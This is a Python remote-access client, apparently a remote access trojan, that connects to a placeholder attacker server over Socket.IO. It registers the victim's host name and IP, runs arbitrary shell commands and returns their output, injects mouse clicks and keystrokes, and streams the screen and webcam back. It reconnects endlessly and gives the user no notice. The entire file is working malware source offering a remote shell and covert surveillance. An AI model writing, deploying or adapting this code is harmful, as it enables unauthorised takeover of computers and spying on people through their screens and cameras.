import os, subprocess, threading, base64, time, socket, platform
import socketio, pyautogui, cv2, numpy as np

SERVER_URL = "http://your_ip:your_server_port" 
sio = socketio.Client()
pyautogui.FAILSAFE = False
SCREEN_SIZE = pyautogui.size()

# Atomic state management to prevent "Frozen" threads
FLAGS = {"screen": False, "cam": False}

KEY_MAP = {
    "Control": "ctrl", "Meta": "win", "Alt": "alt", "Shift": "shift",
    "Enter": "enter", "Backspace": "backspace", "Escape": "esc", "Tab": "tab",
    " ": "space", "ArrowUp": "up", "ArrowDown": "down", "ArrowLeft": "left", "ArrowRight": "right"
}

@sio.on('connect')
def on_connect():
    sio.emit('register_client', {
        'name': f"{platform.node()} ({platform.system()})",
        'ip': socket.gethostbyname(socket.gethostname())
    })

@sio.on('dispatch')
def on_dispatch(data):
    global FLAGS
    action = data.get('action')

    if action == 'shell':
        try:
            output = subprocess.check_output(data['data'], shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
            sio.emit('shell_response', {'output': output.decode('cp1252', errors='replace')})
        except Exception as e:
            sio.emit('shell_response', {'output': str(e)})

    elif action == 'click':
        pyautogui.click(int(data['x'] * SCREEN_SIZE.width), int(data['y'] * SCREEN_SIZE.height))

    elif action == 'keypress':
        key = data['key']
        pyautogui.press(KEY_MAP.get(key, key.lower()))

    elif action == 'start_share':
        FLAGS["cam"] = False 
        time.sleep(0.1)
        if not FLAGS["screen"]:
            FLAGS["screen"] = True
            threading.Thread(target=screen_streamer, daemon=True).start()
    
    elif action == 'stop_share':
        FLAGS["screen"] = False
    
    elif action == 'start_webcam':
        FLAGS["screen"] = False
        time.sleep(0.1)
        if not FLAGS["cam"]:
            FLAGS["cam"] = True
            threading.Thread(target=cam_streamer, daemon=True).start()
            
    elif action == 'stop_webcam':
        FLAGS["cam"] = False

def screen_streamer():
    while FLAGS["screen"]:
        try:
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            mx, my = pyautogui.position()
            cv2.circle(frame, (mx, my), 8, (0,0,255), -1)
            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
            sio.emit('frame_data', {'frame': base64.b64encode(buffer).decode(), 'type': 'screen'})
            time.sleep(0.05)
        except: break

def cam_streamer():
    cap = cv2.VideoCapture(0)
    while FLAGS["cam"]:
        ret, frame = cap.read()
        if not ret: break
        _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 45])
        sio.emit('frame_data', {'frame': base64.b64encode(buffer).decode(), 'type': 'webcam'})
        time.sleep(0.06)
    cap.release()

if __name__ == "__main__":
    while True:
        try:
            if not sio.connected: sio.connect(SERVER_URL)
            sio.wait()
        except: time.sleep(5)
